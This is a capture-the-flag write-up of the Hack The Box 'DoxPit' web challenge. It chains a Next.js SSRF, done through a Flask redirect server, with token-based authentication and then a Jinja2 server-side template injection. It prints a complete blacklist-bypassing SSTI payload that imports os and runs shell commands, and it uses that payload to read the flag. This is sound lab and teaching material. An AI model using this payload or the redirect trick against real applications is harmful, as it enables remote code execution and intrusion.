---
title: Solving DoxPit Challange
published: false
---
### [HTB] Solving DoxPit Challange
To test this, I set up a simple Flask application to serve as a local endpoint
# got it from: https://www.assetnote.io/resources/research/digging-for-ssrf-in-nextjs-apps?ref=assetnote.io

from flask import Flask, Response, request, redirect
app = Flask(__name__)

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch(path):
    if request.method == 'HEAD':
        resp = Response("")
        resp.headers['Content-Type'] = 'text/x-component'
        return resp
    return redirect('http://0.0.0.0:3000')
Accessing the Internal App
After configuring Burp Suite to redirect requests to this local Flask server, I was able to access the internal Flask application running on port 3000
The next step was to interact with the application, starting by registering a new account, as the application required registration for further actions
The registration endpoint allowed us to create an account using a simple GET request
@web.route("/register", methods=["GET"])
def register():
  username = request.args.get("username")
  password = request.args.get("password")

  if not username or not password:
    return render_template("register.html", title="register")

  db_session = Database()
  token = generate(16)
  user_valid = db_session.create_user(username, password, token)
  
  if not user_valid:
    return render_template("error.html", title="error", error="user exists"), 401

  return render_template("error.html", title="success", error=f"User created with token: {token}"), 200
So I changed my server to point to http://0.0.0.0:3000/register?username=kebda&password=3afroto
With the account successfully created, the application returned a session token
Using this token, I could now authenticate and access protected areas of the application, I appended the token to the URL to authenticate: http://0.0.0.0:3000/home?token=c84964fbd5a45090c841695b2a7d8530
# auth handling function
def auth_middleware(func):
  def check_user(*args, **kwargs):
    db_session = Database()

    if not session.get("loggedin"):
      if request.args.get("token") and db_session.check_token(request.args.get("token")):
        return func(*args, **kwargs)
      else:
        return redirect("/login")

    return func(*args, **kwargs)

  check_user.__name__ = func.__name__
  return check_user
This step was crucial, as it allowed me to gain access to the authenticated portions of the site where the SSTI vulnerability could be further exploited:D
let's jump into directory parameter to get this SSTI!
I initially tried common payloads like {{1*8}}, but these were blocked due to a blacklist filtering out certain characters:(
invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]

...
  if any(char in directory for char in invalid_chars):
    return render_template("error.html", title="error", error="invalid directory"), 400
Bypassing the Blacklist
To bypass this filter, I searched for alternative approaches and found a method in this article
The idea was to use another input parameter to read the payload, this approach involved crafting a payload that would bypass the filter
+---------------------------+
|       Main Input          |
|  (Filtered by blacklist)  |
+---------------------------+
            |
            v
+---------------------------+
|       Alternative         |
|        Input Parameter     |
|    (Not filtered)         |
+---------------------------+
            |
            v
+---------------------------+
|   Payload Injection       |
|   (Bypassing the filter)  |
+---------------------------+
            |
            v
+---------------------------+
|       Final Output        |
|  (Executed Command Result)|
+---------------------------+
And that's the payload I came with
{%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=
To bypass the filter, I crafted a payload that cleverly navigates around the blacklisted characters
invalid_chars = ["{{", "}}", ".", "_", "[", "]","\\", "x"]
I replaced blacklisted characters and patterns with alternatives:
{{ was replaced with {%.
}} was replaced with %}.
. was bypassed by using attribute chaining through the request object.
_ was avoided by using alternative attribute names and methods.
[ and ] were substituted with attribute access via attr().
\\ and x were sidestepped by constructing the payload in a way that didn't require these characters.

I navigated through the request attributes to access Python's globals and builtins dictionaries, using the import function, I imported the os module and used its popen method to OS execute commands
- - - - - - - - - - - - - - - - -
And Successfully executed the id command, confirming root access
http://0.0.0.0:3000/home?token=<>&directory={%with output=((((request|attr('application'))|attr(request|attr("args")|attr("get")('globals')))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('builtins'))|attr(request|attr("args")|attr("get")('getitem')))(request|attr("args")|attr("get")('import'))('os')|attr('popen')(request|attr("args")|attr("get")('cmd'))|attr('read')()%}{%print(output)%}{%endwith%}&globals=__globals__&getitem=__getitem__&builtins=__builtins__&import=__import__&cmd=id
Nice, Root:)
Ran ls -lah / to list the system files, which revealed the flag's location
nice flag is there, lets use catto read the flag from the file, successfully retrieving it
And That's it
Bye UwU.
